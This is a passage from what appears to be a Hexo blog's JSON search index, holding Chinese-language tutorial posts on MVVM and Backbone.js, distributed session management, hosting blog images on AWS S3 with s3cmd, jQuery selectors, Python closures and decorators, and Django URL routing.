与MVP不同的是，没有了View为Presente提供的接口，之前由Presenter负责的View和Model之间的数据同步交给了ViewModel中的数据绑定进行处理，当Model发生变化，ViewModel就会自动更新；ViewModel变化，Model也会更新。 12345678910111213141516new Vue(&#123; el: '#myapp', data: data, methods: &#123; add(v) &#123; if(this.val &lt; 100) &#123; this.val += v; &#125; &#125;, sub(v) &#123; if(this.val &gt; 0) &#123; this.val -= v; &#125; &#125; &#125;&#125;); 整体来看，比MVC/MVP精简了很多，不仅仅简化了业务与界面的依赖，还解决了数据频繁更新（以前用jQuery操作DOM很繁琐）的问题。因为在MVVM中，View不知道Model的存在，ViewModel和Model也察觉不到View，这种低耦合模式可以使开发过程更加容易，提高应用的可重用性。 数据绑定（Data Binding）在Vue中，使用了双向绑定技术（Two-Way-Data-Binding），就是View的变化能实时让Model发生变化，而Model的变化也能实时更新到View。 不同的MVVM框架中，实现双向数据绑定的技术有所不同。目前一些主流的前端框架实现数据绑定的方式大致有以下几种： 数据劫持 (Vue) 发布-订阅模式 (Knockout、Backbone) 脏值检查 (Angular) 一些MV*框架Backbone.jsBackbone通过提供模型Model、集合Collection、视图View赋予了Web应用程序分层结构，其中模型包含领域数据和自定义事件；集合Colection是模型的有序或无序集合，带有丰富的可枚举API； 视图可以声明事件处理函数。最终将模型、集合、视图与服务端的RESTful JSON接口连接。 Backbone在升级的过程中，去掉了controller，由view和router代替controller，view集中处理了用户事件（如click，keypress等）、渲染HTML模板、与模型数据的交互。Backbone的model没有与UI视图进行数据绑定，而是需要在view中自行操作DOM来更新或读取UI数据。Router为客户端路由提供了许多方法，并能连接到指定的动作（actions）和事件（events）。 Backbone是一个小巧灵活的库，只是帮你实现一个MVC模式的框架，更多的还需要自己去实现。适合有一定Web基础，喜欢原生JS去操作DOM（因为没有数据绑定）的开发人员。为什么称它为库，而不是框架，不仅仅是由于仅4KB的代码，更重要的是 使用一个库，你有控制权。如果用一个框架，控制权就反转了，变成框架在控制你。库能够给予灵活和自由，但是框架强制使用某种方式，减少重复代码。这便是Backbone与Angular的区别之一了。 至于Backbone属于MV*中的哪种模式，有人认为不是MVC，有人觉得更接近于MVP，事实上，它借用多个架构模式中一些很好的概念，创建一个运行良好的灵活框架。不必拘泥于某种模式。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// view:var Appview = Backbone.View.extend(&#123; // 每个view都需要一个指向DOM元素的引用，就像ER中的main属性。 el: '#container', // view中不包含html标记，有一个链接到模板的引用。 template: _.template(\"&lt;h3&gt;Hello &lt;%= who %&gt;&lt;/h3&gt;\"), // 初始化方法 initialize: function()&#123; this.render(); &#125;, // $el是一个已经缓存的jQuery对象 render: function()&#123; this.$el.html(\"Hello World\"); &#125;, // 事件绑定 events: &#123;'keypress #new-todo': 'createTodoOnEnter'&#125;&#125;);var appview = new Appview();// model:// 每个应用程序的核心、包含了交互数据和逻辑// 如数据验证、getter、setter、默认值、数据初始化、数据转换var app = &#123;&#125;;app.Todo = Backbone.model.extend(&#123; defaults: &#123; title: '', completed: false &#125;&#125;);// 创建一个model实例var todo = new app.Todo(&#123;title: 'Learn Backbone.js', completed: false&#125;);todo.get('title'); // \"Learn Backbone.js\"todo.get('completed'); // falsetodo.get('created_at'); // undefinedtodo.set('created_at', Date());todo.get('created_at'); // \"Wed Sep 12 2012 12:51:17 GMT-0400 (EDT)\"// collection：// model的有序集合，可以设置或获取model// 监听集合中的数据变化，从后端获取模型数据、持久化。app.TodoList = Backbone.Collection.extend(&#123; model: app.Todo, localStorage: new Store(\"backbone-todo\")&#125;);// collection实例var todoList = new app.TodoList()todoList.create(&#123;title: 'Learn Backbone\\'s Collection'&#125;);// model实例var model = new app.Todo(&#123;title: 'Learn models', completed: true&#125;);todoList.add(model);todoList.pluck('title');todoList.pluck('completed'); Reference A note on DynaBook requirements Model View Controller History The Evolution of MVC Trygve Reenskaug - The original MVC reports Applications Programming in Smalltalk-80 (TM): How to use Model-View-Controller (MVC) Wikipedia - MVC Cocoa Core Competencies - MVC Concepts in Objective-C Programming - MVC ASP.NET MVC 4 Overview - Web Froms 浅析前端开发中的 MVC/MVP/MVVM 模式 - https://juejin.im/post/593021272f301e0058273468","comments":true,"categories":[{"name":"ArchitecturalPattern","slug":"ArchitecturalPattern","permalink":"http://swsmile.info/categories/ArchitecturalPattern/"}],"tags":[{"name":"Architectural Pattern","slug":"Architectural-Pattern","permalink":"http://swsmile.info/tags/Architectural-Pattern/"}]},{"title":"【Distributed System】分布式 session（Distributed Seesion）","date":"2019-11-10T11:52:56.000Z","path":"2019/11/10/【Distributed-System】分布式 session/","text":"BackgroundSession的作用？ Session 是客户端与服务器通讯会话跟踪技术，服务器与客户端保持整个通讯的会话基本信息。 客户端在第一次访问服务端的时候，服务端会响应一个sessionId并且将它存入到本地cookie中，在之后的访问会将cookie中的sessionId放入到请求头中去访问服务器，如果通过这个sessionid没有找到对应的数据那么服务器会创建一个新的sessionid并且响应给客户端。 分布式Session存在的问题？ 假设第一次访问服务A生成一个sessionid并且存入cookie中，第二次却访问服务B客户端会在cookie中读取sessionid加入到请求头中，如果在服务B通过sessionid没有找到对应的数据那么它创建一个新的并且将sessionid返回给客户端,这样并不能共享我们的Session无法达到我们想要的目的。 分布式session管理实现方案分布式Session有如下几种实现方式。 1 Session复制 任何一个服务器上的session发生改变（增删改），该节点会把这个 session的所有内容序列化，然后广播给所有其它节点，不管其他服务器需不需要session，以此来保证Session同步。 优点：代码上不需要做支持和修改。 缺点：需要对应支持session 复制的Web服务器，会对网络负荷造成一定压力，如果session量大的话可能会造成网络堵塞，拖慢服务器性能。 适用场景：只适用于Web服务器比较少且Session数据量少的情况。 可用方案：开源方案tomcat-redis-session-manager，暂不支持Tomcat8。 2 Session粘滞 将用户的每次请求都通过某种方法强制分发到某一个特定Web服务器上。具体来说，用户第一次请求时，负载均衡器将用户的请求转发到了A服务器上，那么用户以后的每次请求都会转发到A服务器上。 优点：使用简单，没有额外开销。 缺点：一旦某个Web服务器重启或宕机，相对应的Session数据将会丢失，而且需要依赖负载均衡机制。 适用场景：对稳定性要求不是很高的业务情景。 3 Session集中管理 在单独的服务器或服务器集群上使用缓存技术，如Redis存储Session数据，集中管理所有的Session，所有的Web服务器都从这个存储介质中存取对应的Session，实现Session共享。 优点：可靠性高，减少Web服务器的资源开销。 缺点：实现上有些复杂，配置较多。 适用场景：Web服务器较多、要求高可用性的情况。 可用方案：开源方案Spring Session，也可以自己实现，主要是重写HttpServletRequestWrapper中的getSession方法。 4 基于Cookie管理这种方式在每次发起请求的时候，都需要将Session数据放到Cookie中传递给服务端。 优点：不需要依赖额外外部存储，不需要额外配置。 缺点：不安全，易被盗取或篡改；Cookie数量和长度有限制，需要消耗更多网络带宽。 适用场景：数据不重要、不敏感且数据量小的情况。 微服务架构中的分布式 sessionWeb应用持续发展，虽然进行了一定的拆分，把过去单体架构的巨石应用切割成了由若干个模块组成的分布式应用，但随着不断的迭代开发，这些模块应用依然会变成巨石应用，代码维护成本直线上升。 尽管可以再次进行应用拆分，但是随着拆分的应用增多，这些应用的编译、打包、部署和整合也成为了新的难题。在这样的一个环境之下，微服务架构开始受到广泛关注。 微服务架构即将一个应用拆分成一套小而相互关联的微服务，微服务之间通过暴露出来的API被其他微服务或系统所调用，在运行时，每个微服务实例通常是一个云虚拟机或一个Docker。众多微服务综合起来，构成了一个完整的微服务架构应用。 微服务架构中的微服务一般可以分为两类：无状态服务和有状态服务。无状态服务比如应用服务器，它们通常是不保存数据的，方便进行横向扩展；有状态服务需要进行数据存储，比如数据库服务和缓存服务。在Web应用中，Session用来存储用户的状态信息，所以Session管理也是有状态服务器的一种。 在分布式架构中，Session管理方案是将用户Session存放在Web服务器内存中，然后通过Web服务器的复制能力或者负载均衡器的请求分发能力来实现Session共享。但是在微服务架构的实践中，企业对大型应用进行微服务改造，让应用向云环境迁移，通常会将应用拆分成十几个甚至数十个微应用，如果仍然使用Session复制、粘滞，不但会带来很多的不必要资源开销，还会降低整个企业应用的可用性和安全性。 因此，在微服务架构下，对Session的管理应该另辟蹊径，不再将Session对象保存在Web服务器内存中，而是在应用服务器架构中引入独立的中间存储介质，将企业应用中的Session对象进行统一管理。 一个好的Session集中管理方案应该具备以下特点： 中间存储介质的读写速度要快。之前的Session管理方案将Session对象存放在服务器内存中，有着很高的读写速度，进行Session集中管理后将会在Session读写中引入网络传输，速度会有所降低，所以必须保证中间存储介质的读写速度。 中间存储介质要保证高可用。进行Session集中管理后，整个企业应用的Session都会存放在中间存储介质中，如果存储介质是不稳定的，那整个企业应用都将不稳定。 对Session的使用者来说，Session管理方案应该是透明的， Session管理方案不该和某一Web服务器耦合，应该适用于所有常规Web服务器。 Reference https://www.cnblogs.com/study-everyday/p/7853145.html https://confluence.shopee.io/display/LABS/7.2+Session https://juejin.im/post/5c13bea65188251595128d4b http://primeton.com/read.php?id=2244&amp;his=1 https://github.com/L316476844/distributed-session","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【hexo】使用 AWS s3 作为 hexo 图库","date":"2019-11-10T10:25:11.000Z","path":"2019/11/10/【hexo】使用-s3-作为-hexo-图库/","text":"AWS s3AWS 的对象存储服务。 CloudFront DistributionCloudFront Distribution 是AWS的内容分发（CDN）使得全球各地都能以最快的速度访问到AWS最近的节点（对于中国，最近的是东京，经测，也已经足够快），并且可绑定或者生产SSL证书。 AWS s3cmdInstall1$ brew install s3cmd ConfigGenerate an access key from https://console.aws.amazon.com/iam/home?region=ap-northeast-1#/security_credentials, and set it when executing: 1$ s3cmd --configure So that we can locally manage all images used in our blogs, i.e., upload or download. 1s3cmd get --recursive s3://zzx6ssadcq/img/assets/ Reference https://s3tools.org/s3cmd-sync https://troyyang.com/2018/02/16/hosting-images-with-aws-s3/ https://aws.amazon.com/cn/premiumsupport/knowledge-center/s3-access-denied-bucket-policy/ https://aws.amazon.com/cn/blogs/china/cloudfront-errors-solutions/ https://medium.com/@shamnad.p.s/how-to-create-an-s3-bucket-and-aws-access-key-id-and-secret-access-key-for-accessing-it-5653b6e54337","comments":true,"categories":[{"name":"hexo","slug":"hexo","permalink":"http://swsmile.info/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://swsmile.info/tags/hexo/"}]},{"title":"【JQuery】获取对象","date":"2019-11-10T10:20:03.000Z","path":"2019/11/10/【JQuery】获取对象/","text":"1234$(&quot;#myELement&quot;) 选择id值等于myElement的元素，id值不能重复在文档中只能有一个id值是myElement所以得到的是唯一的元素 $(&quot;div&quot;) 选择所有的div标签元素，返回div元素数组 $(&quot;.myClass&quot;) 选择使用myClass类的css的所有元素 $(&quot;*&quot;) 选择文档中的所有的元素，可以运用多种的选择方式进行联合选择：例如$(&quot;#myELement,div,.myclass&quot;) 层叠选择器1234$(&quot;form input&quot;) 选择所有的form元素中的input元素 $(&quot;#main &gt; *&quot;) 选择id值为main的所有的子元素 $(&quot;label + input&quot;) 选择所有的label元素的下一个input元素节点，经测试选择器返回的是label标签后面直接跟一个input标签的所有input标签元素 $(&quot;#prev ~ div&quot;) 同胞选择器，该选择器返回的为id为prev的标签元素的所有的属于同一个父元素的div标签 基本过滤选择器123$(&quot;tr:first&quot;) 选择所有tr元素的第一个 $(&quot;tr:last&quot;) 选择所有tr元素的最后一个 $(&quot;input:not(:checked) + span&quot;) 属性过滤选择器12345678910$(&quot;div[id]&quot;) 选择所有含有id属性的div元素 $(&quot;input[name=&apos;newsletter&apos;]&quot;) 选择所有的name属性等于&apos;newsletter&apos;的input元素 $(&quot;input[name!=&apos;newsletter&apos;]&quot;) 选择所有的name属性不等于&apos;newsletter&apos;的input元素 $(&quot;input[name^=&apos;news&apos;]&quot;) 选择所有的name属性以&apos;news&apos;开头的input元素 $(&quot;input[name$=&apos;news&apos;]&quot;) 选择所有的name属性以&apos;news&apos;结尾的input元素 $(&quot;input[name*=&apos;man&apos;]&quot;) 选择所有的name属性包含&apos;news&apos;的input元素 $(&quot;input[id][name$=&apos;man&apos;]&quot;) 可以使用多个属性进行联合选择，该选择器是得到所有的含有id属性并且那么属性以man结尾的元素 表单元素选择器123456789101112$(&quot;:input&quot;) 选择所有的表单输入元素，包括input, textarea, select 和 button $(&quot;:text&quot;) 选择所有的text input元素 $(&quot;:password&quot;) 选择所有的password input元素 $(&quot;:radio&quot;) 选择所有的radio input元素 $(&quot;:checkbox&quot;) 选择所有的checkbox input元素 $(&quot;:submit&quot;) 选择所有的submit input元素 $(&quot;:image&quot;) 选择所有的image input元素 $(&quot;:reset&quot;) 选择所有的reset input元素 $(&quot;:button&quot;) 选择所有的button input元素 $(&quot;:file&quot;) 选择所有的file input元素 $(&quot;:hidden&quot;) 选择所有类型为hidden的input元素或表单的隐藏域 Reference https://blog.csdn.net/zengyonglan/article/details/53995295 https://www.cnblogs.com/onlys/articles/jQuery.html","comments":true,"categories":[{"name":"JQuery","slug":"JQuery","permalink":"http://swsmile.info/categories/JQuery/"}],"tags":[{"name":"JQuery","slug":"JQuery","permalink":"http://swsmile.info/tags/JQuery/"}]},{"title":"【Python】闭包和匿名函数","date":"2019-11-10T09:08:48.000Z","path":"2019/11/10/【Python】闭包和匿名函数/","text":"高阶函数（Higher-order function）变量可以指向函数以Python内置的求绝对值的函数abs()为例，调用该函数用以下代码： 12&gt;&gt;&gt; abs(-10)10 但是，如果只写abs呢？ 12&gt;&gt;&gt; abs&lt;built-in function abs&gt; 可见，abs(-10)是函数调用，而abs是函数本身。 要获得函数调用结果，我们可以把结果赋值给变量： 123&gt;&gt;&gt; x = abs(-10)&gt;&gt;&gt; x10 但是，如果把函数本身赋值给变量呢？ 123&gt;&gt;&gt; f = abs&gt;&gt;&gt; f&lt;built-in function abs&gt; 结论：函数本身也可以赋值给变量，即：变量可以指向函数。 如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下： 123&gt;&gt;&gt; f = abs&gt;&gt;&gt; f(-10)10 成功！说明变量f现在已经指向了abs函数本身。直接调用abs()函数和调用变量f()完全相同。 函数名也是变量那么函数名是什么呢？函数名其实就是指向函数的变量！对于abs()这个函数，完全可以把函数名abs看成变量，它指向一个可以计算绝对值的函数！ 如果把abs指向其他对象，会有什么情况发生？ 12345&gt;&gt;&gt; abs = 10&gt;&gt;&gt; abs(-10)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: 'int' object is not callable 把abs指向10后，就无法通过abs(-10)调用该函数了！因为abs这个变量已经不指向求绝对值函数而是指向一个整数10！ 当然实际代码绝对不能这么写，这里是为了说明函数名也是变量。要恢复abs函数，请重启Python交互环境。 注：由于abs函数实际上是定义在import builtins模块中的，所以要让修改abs变量的指向在其它模块也生效，要用import builtins; builtins.abs = 10。 传入函数既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。 一个最简单的高阶函数： 12def add(x, y, f): return f(x) + f(y) 当我们调用add(-5, 6, abs)时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为： 函数作为返回值高阶函数除了可以接受函数作为参数外，还可以把函数作为结果值返回。 我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的： 12345def calc_sum(*args): ax = 0 for n in args: ax = ax + n return ax 但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，而是返回求和的函数： 1234567def lazy_sum(*args): def sum(): ax = 0 for n in args: ax = ax + n return ax return sum 当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数： 123&gt;&gt;&gt; f = lazy_sum(1, 3, 5, 7, 9)&gt;&gt;&gt; f&lt;function lazy_sum.&lt;locals&gt;.sum at 0x101c6ed90&gt; 调用函数f时，才真正计算求和的结果： 12&gt;&gt;&gt; f()25 在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为“闭包（Closure）”的程序结构拥有极大的威力。 请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数： 1234&gt;&gt;&gt; f1 = lazy_sum(1, 3, 5, 7, 9)&gt;&gt;&gt; f2 = lazy_sum(1, 3, 5, 7, 9)&gt;&gt;&gt; f1==f2False f1()和f2()的调用结果互不影响。 闭包注意到返回的函数在其定义内部引用了局部变量args，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。 另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。我们来看一个例子： 123456789def count(): fs = [] for i in range(1, 4): def f(): return i*i fs.append(f) return fsf1, f2, f3 = count() 在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。 你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是： 123456&gt;&gt;&gt; f1()9&gt;&gt;&gt; f2()9&gt;&gt;&gt; f3()9 全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变量i已经变成了3，因此最终结果为9。 返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变： 123456789def count(): def f(j): def g(): return j*j return g fs = [] for i in range(1, 4): fs.append(f(i)) # f(i)立刻被执行，因此i的当前值被传入f() return fs 再看看结果： 1234567&gt;&gt;&gt; f1, f2, f3 = count()&gt;&gt;&gt; f1()1&gt;&gt;&gt; f2()4&gt;&gt;&gt; f3()9 缺点是代码较长，可利用lambda函数缩短代码。 匿名函数当我们在传入函数时，有些时候，不需要显式地定义函数，直接传入匿名函数更方便。 在Python中，对匿名函数提供了有限支持。还是以map()函数为例，计算$f(x)=x^2$时，除了定义一个f(x)的函数外，还可以直接传入匿名函数： 12&gt;&gt;&gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))[1, 4, 9, 16, 25, 36, 49, 64, 81] 通过对比可以看出，匿名函数lambda x: x * x实际上就是： 12def f(x): return x * x 关键字lambda表示匿名函数，冒号前面的x表示函数参数。 匿名函数有个限制，就是只能有一个表达式，不用写return，返回值就是该表达式的结果。 用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数： 12345&gt;&gt;&gt; f = lambda x: x * x&gt;&gt;&gt; f&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;&gt;&gt;&gt; f(5)25 同样，也可以把匿名函数作为返回值返回，比如： 12def build(x, y): return lambda: x * x + y * y Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】装饰器（Wrapper）","date":"2019-11-10T09:07:23.000Z","path":"2019/11/10/【Python】装饰器（Wrapper）/","text":"Introduction每个人都有的内裤主要功能是用来遮羞，但是到了冬天它没法为我们防风御寒，咋办？ 我们想到的一个办法就是把内裤改造一下，让它变得更厚更长。这样一来，它不仅有遮羞功能，还能提供保暖。 不过有个问题，这个内裤被我们改造成了长裤后，虽然还有遮羞功能，但本质上它不再是一条真正的内裤了。于是聪明的人们发明长裤，在不影响内裤的前提下，直接把长裤套在了内裤外面，这样内裤还是内裤，有了长裤后宝宝再也不冷了。装饰器就像我们这里说的长裤，在不影响内裤作用的前提下，给我们的身子提供了保暖的功效。 谈装饰器前，还要先要明白一件事，Python 中的函数和 Java、C++不太一样，Python 中的函数可以像普通变量一样当做参数传递给另外一个函数，例如： 1234567def foo(): print(\"foo\")def bar(func): func()bar(foo) 回到我们的主题。装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景，装饰器是解决这类问题的绝佳设计。 有了装饰器，我们就可以将大量与函数功能本身无关、但是又相似的代码抽离到装饰器中，并获得重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 先来看一个简单例子，虽然实际代码可能比这复杂很多： 12def foo(): print('i am foo') 现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志记录代码： 123def foo(): print('i am foo') logging.info(\"foo is running\") 如果函数 bar()、bar2() 也有类似的需求，怎么做？再写一个 logging 在 bar 函数里？这样就造成大量雷同的代码。为了减少重复代码（同时也就增加了重用性（reusability）），我们可以这样做，重新定义一个新的函数：专门处理日志 ，日志处理完之后再执行真正的业务代码 12345678def use_logging(func): logging.warn(\"%s is running\" % func.__name__) func()def foo(): print('i am foo')use_logging(foo) 这样做逻辑上是没问题的，功能是实现了，但是我们调用的时候不再是调用真正的业务逻辑 foo 函数，而是换成了 use_logging 函数，这就破坏了原有的代码结构， 即我们不得不每次都要把原来的那个 foo 函数作为参数传递给 use_logging 函数。那么有没有更好的方式的呢？当然有，答案就是装饰器。 简单装饰器123456789101112def use_logging(func): def wrapper(): logging.warn(\"%s is running\" % func.__name__) return func() # 把 foo 当做参数传递进来时，执行func()就相当于执行foo() return wrapperdef foo(): print('i am foo')foo = use_logging(foo) # 因为装饰器 use_logging(foo) 返回的时函数对象 wrapper，这条语句相当于 foo = wrapperfoo() # 执行foo()就相当于执行 wrapper() use_logging 就是一个装饰器，它一个普通的函数，它把执行真正业务逻辑的函数 func 包裹在其中，看起来像 foo 被 use_logging 装饰了一样，use_logging 返回的也是一个函数，这个函数的名字叫 wrapper。在这个例子中，函数进入和退出时 ，被称为一个横切面，这种编程方式被称为面向切面的编程（Aspect-oriented Programming，AOP）。 @ 语法糖如果你接触 Python 有一段时间了的话，想必你对 @ 符号一定不陌生了。 没错 @ 符号就是装饰器的语法糖，它放在函数开始定义的地方，这样就可以省略最后一步再次赋值的操作。 123456789101112def use_logging(func): def wrapper(): logging.warn(\"%s is running\" % func.__name__) return func() return wrapper@use_loggingdef foo(): print(\"i am foo\")foo() 如上所示，有了 @ ，我们就可以省去foo = use_logging(foo)这一句了，直接调用 foo() 即可得到想要的结果。 你们看到了没有，foo() 函数不需要做任何修改，只需在定义的地方加上装饰器，调用的时候还是和以前一样，如果我们有其他的类似函数，我们可以继续调用装饰器来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。 装饰器在 Python 使用如此方便都要归因于 Python 的函数能像普通的对象一样能作为参数传递给其他函数，可以被赋值给其他变量，可以作为返回值，可以被定义在另外一个函数内。 或者可以这样写： 12345678def simple_decorator(f): print('enter function') f() print('exited function')@simple_decoratordef hello(): print('hello world') 但很奇怪的问题在于，以下 print 会被自动触发： 123enter functionhello worldexited function 带参数的业务逻辑函数可能有人问，如果我的业务逻辑函数 foo 需要参数怎么办？比如： 12def foo(name): print(\"i am %s\" % name) 我们可以在定义装饰器的 wrapper 函数时指定参数： 1234def wrapper(name): logging.warn(\"%s is running\" % func.__name__) return func(name) return wrapper 这样 foo 函数定义的参数就可以定义在 wrapper 函数中。 args、*kwargs这时，又有人要问了，如果 foo 函数接收两个参数呢？三个参数呢？更有甚者，我可能传很多个。当装饰器不知道 foo 到底有多少个参数时，我们可以用 *args 来代替： 1234def wrapper(*args): logging.warn(\"%s is running\" % func.__name__) return func(*args) return wrapper 如此一来，甭管 foo 定义了多少个参数，我都可以完整地传递到 func 中去。这样就不影响 foo 的业务逻辑了。 关键字参数（Keyword Arguments）这时还有读者会问，如果 foo 函数还定义了一些关键字参数呢？比如： 12def foo(name, age=None, height=None): print(\"I am %s, age %s, height %s\" % (name, age, height)) 这时，你就可以把 wrapper 函数指定关键字函数： 12345def wrapper(*args, **kwargs): # args是一个数组，kwargs一个字典 logging.warn(\"%s is running\" % func.__name__) return func(*args, **kwargs) return wrapper 带参数的装饰器装饰器还有更大的灵活性，例如带参数的装饰器，在上面的装饰器调用中，该装饰器接收唯一的参数就是执行业务的函数 foo 。装饰器的语法允许我们在调用时，提供其它参数，比如@decorator(a)。这样，就为装饰器的编写和使用提供了更大的灵活性。比如，我们可以在装饰器中指定日志的等级，因为不同业务函数可能需要的日志级别是不一样的。 1234567891011121314151617def use_logging(level): def decorator(func): def wrapper(*args, **kwargs): if level == \"warn\": logging.warn(\"%s is running\" % func.__name__) elif level == \"info\": logging.info(\"%s is running\" % func.__name__) return func(*args) return wrapper return decorator@use_logging(level=\"warn\")def foo(name='foo'): print(\"i am %s\" % name)foo() 类装饰器没错，装饰器不仅可以是函数，还可以是类，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器主要依靠类的__call__方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。 1234567891011121314class Foo(object): def __init__(self, func): self._func = func def __call__(self): print ('class decorator runing') self._func() print ('class decorator ending')@Foodef bar(): print ('bar')bar() functools.wraps使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的docstring、__name__、参数列表，先看例子： 123456789101112131415# 装饰器def logged(func): def with_logging(*args, **kwargs): print func.__name__ # 输出 'with_logging' print func.__doc__ # 输出 None return func(*args, **kwargs) return with_logging# 函数@loggeddef f(x): \"\"\"does some math\"\"\" return x + x * xlogged(f) 不难发现，函数 f 被with_logging取代了，当然它的docstring，__name__就是变成了with_logging函数的信息了。好在我们有functools.wraps，wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器里面的 func 函数中，这使得装饰器里面的 func 函数也有和原函数 foo 一样的元信息了。 12345678910111213from functools import wrapsdef logged(func): @wraps(func) def with_logging(*args, **kwargs): print func.__name__ # 输出 'f' print func.__doc__ # 输出 'does some math' return func(*args, **kwargs) return with_logging@loggeddef f(x): \"\"\"does some math\"\"\" return x + x * x 装饰器顺序一个函数还可以同时定义多个装饰器，比如： 12345@a@b@cdef f (): pass 它的执行顺序是从里到外，最先调用最里层的装饰器，最后调用最外层的装饰器，它等效于 1f = a(b(c(f))) Reference https://www.cnblogs.com/huxi/archive/2011/03/01/1967600.html https://foofish.net/python-decorator.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Django 路由规则","date":"2019-11-10T09:06:24.000Z","path":"2019/11/10/【Django】Django-路由/","text":"编写urlpatterns最简单的情况123456#urls.py from app import views #这里的app是你自己的应用的名字 from django.urls import path urlpatterns = [ path('index/', views.index, name='index'), ] 该方法对应view.py中的函数为： 1234#views.pydef index(request): ... return render(request,'index.html') 从views中继承的类123456#urls.pyfrom app.views import LoginViewfrom django.urls import pathurlpatterns = [ path('login/', LoginView.as_view(), name='login'),] 该方法对应的view.py中为： 12345678910#views.pyclass LoginView(View): # 请求为get时 def get(self,request): ... return render(request, 'login.html') # 请求为post时 def post(self,request): ... return render(request,'login.html') 使用include()如果我们的 Django 项目比较大，可能会将每个模块都写在一个 Django App 中，这时候就需要用到 include() 以将其他 Django App 的路由规则引入到Django 项目中。 在Django 项目的 urls.py中： 1234567urlpatterns = patterns( '', ... (r'^user/', include('backend.user.urls')), (r'^product/', include('backend.product.urls'))) 在 user 这个 Django App（位于 user 文件夹）的 urls.py 中，定义了这个App 中对应的路由规则。 12345678910111213urlpatterns = patterns( '', (r'^$', views.home), (r'^json/$', views.home_json), (r'^account_info/(?P&lt;userid&gt;\\d+)/$', views.account_info), (r'^account_info/(?P&lt;userid&gt;\\d+)/post/$', views.account_info_post), ...)# views.pydef account_info(request, userid): ... 当用户访问 127.0.0.0/user/account_info/(?P&lt;userid&gt;\\d+)/ 时，user 这个 Django App 下的 views.account_info 方法就会被调用以响应 request。 How Django processes a requestWhen a user requests a page from your Django-powered site, this is the algorithm the system follows to determine which Python code to execute: Django determines the root URLconf module to use. Ordinarily, this is the value of the ROOT_URLCONF setting, but if the incoming HttpRequest object has a urlconf attribute (set by middleware), its value will be used in place of the ROOT_URLCONF setting. Django loads that Python module and looks for the variable urlpatterns. This should be a sequence of django.urls.path() and/or django.urls.re_path() instances. Django runs through each URL pattern, in order, and stops at the first one that matches the requested URL. Once one of the URL patterns matches, Django imports and calls the given view, which is a simple Python function (or a class-based view). The view gets passed the following arguments: An instance of HttpRequest. If the matched URL pattern returned no named groups, then the matches from the regular expression are provided as positional arguments. The keyword arguments are made up of any named parts matched by the path expression, overridden by any arguments specified in the optional kwargs argument to django.urls.path() or django.urls.re_path(). If no URL pattern matches, or if an exception is raised during any point in this process, Django invokes an appropriate error-handling view. See Error handling below. $ 和 ^ 的含义$如果定义为： 1234urlpatterns = [ url(r'a', views.a), url(r'a/b', views.b),] 那么当访问 http://127.0.0.1:8001/a/b 时，会由 views.a 来处理（而不是 views.b）。因为路由匹配的原则是：从上至下开始匹配，一旦匹配到了某一条规则，则不再继续向下匹配。 若希望 http://127.0.0.1:8001/a/b 能够被路由到 views.b，则需要进行如下定义： 1234urlpatterns = [ url(r'a/$', views.a), url(r'a/b$', views.b),] 在正则表达式中，$表示匹配输入字符串的结尾位置，因此除 querystring 部分之外，URL 的结尾为 a/ 的都会被路由到 views.a，比如： http://127.0.0.1:8001/a/ http://127.0.0.1:8001/sa/ http://127.0.0.1:8001/zzzzzza/ http://127.0.0.1:8001/a/?name=ss，`name=ss` 这个部分就是 querystring ^你可能注意到了，http://127.0.0.1:8001/sa/也会被匹配到 